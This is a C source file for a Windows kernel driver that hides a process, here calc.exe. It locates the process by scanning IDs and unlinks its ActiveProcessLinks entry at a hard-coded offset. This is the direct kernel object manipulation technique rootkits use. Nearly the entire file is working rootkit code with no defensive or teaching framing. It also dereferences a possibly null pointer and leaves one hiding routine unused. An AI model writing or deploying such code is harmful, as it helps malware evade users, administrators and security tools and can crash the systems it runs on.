#include <ntifs.h>
#define PROCESS_ACTIVE_PROCESS_LINKS_OFFSET 0x188
 
NTKERNELAPI NTSTATUS PsLookupProcessByProcessId(HANDLE ProcessId, PEPROCESS *Process);
NTKERNELAPI CHAR* PsGetProcessImageFileName(PEPROCESS Process);
 
VOID 
UnDriver(PDRIVER_OBJECT driver)
{
    	DbgPrint(("YATTTAAAA ❗❗❗❗❗\n"));
}
     
PEPROCESS GetProcessObjectByName(char *name)
{
    	SIZE_T temp;
    	for (temp = 100; temp<10000; temp += 4)
    	{
    		NTSTATUS status;
    		PEPROCESS ep;
    		status = PsLookupProcessByProcessId((HANDLE)temp, &ep);
    		if (NT_SUCCESS(status))
    		{
    			char *pn = PsGetProcessImageFileName(ep);
    			if (_stricmp(pn, name) == 0)
    				return ep;
    		}
    	}
    	return NULL;
}
     
VOID 
RemoveListEntry(PLIST_ENTRY ListEntry)
{
    KIRQL OldIrql;
    OldIrql = KeRaiseIrqlToDpcLevel();
    	if (ListEntry->Flink != ListEntry &&ListEntry->Blink != ListEntry &&ListEntry->Blink->Flink == ListEntry &&ListEntry->Flink->Blink == ListEntry)
    	{
    		ListEntry->Flink->Blink = ListEntry->Blink;
    		ListEntry->Blink->Flink = ListEntry->Flink;
    		ListEntry->Flink = ListEntry;
    		ListEntry->Blink = ListEntry;
    	}
    	KeLowerIrql(OldIrql);
}
     
BOOLEAN Hiding(PUCHAR pszHideProcessName)
{
    PEPROCESS pFirstEProcess = NULL, pEProcess = NULL;
    ULONG ulOffset = 0;
    HANDLE hProcessId = NULL;
    PUCHAR pszProcessName = NULL;
     
    ulOffset = PROCESS_ACTIVE_PROCESS_LINKS_OFFSET;
     
        if (0 == ulOffset)
        {
            return FALSE;
        }
     
        pFirstEProcess = PsGetCurrentProcess();
        pEProcess = pFirstEProcess;
     
        do
        {
            hProcessId = PsGetProcessId(pEProcess);
            pszProcessName = PsGetProcessImageFileName(pEProcess);
            if (0 == _stricmp(pszProcessName, pszHideProcessName))
            {
                RemoveEntryList((PLIST_ENTRY)((PUCHAR)pEProcess + ulOffset));
                break;
            }
     
            pEProcess = (PEPROCESS)((PUCHAR)(((PLIST_ENTRY)((PUCHAR)pEProcess + ulOffset))->Flink) - ulOffset);
        } while (pFirstEProcess != pEProcess);
        return TRUE;
}
     
NTSTATUS 
DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
    PEPROCESS PRoc = NULL;
    PRoc = GetProcessObjectByName("calc.exe");
    RemoveListEntry((PLIST_ENTRY)((ULONG64)PRoc + PROCESS_ACTIVE_PROCESS_LINKS_OFFSET));
    DriverObject->DriverUnload = UnDriver;
    return STATUS_SUCCESS;
}
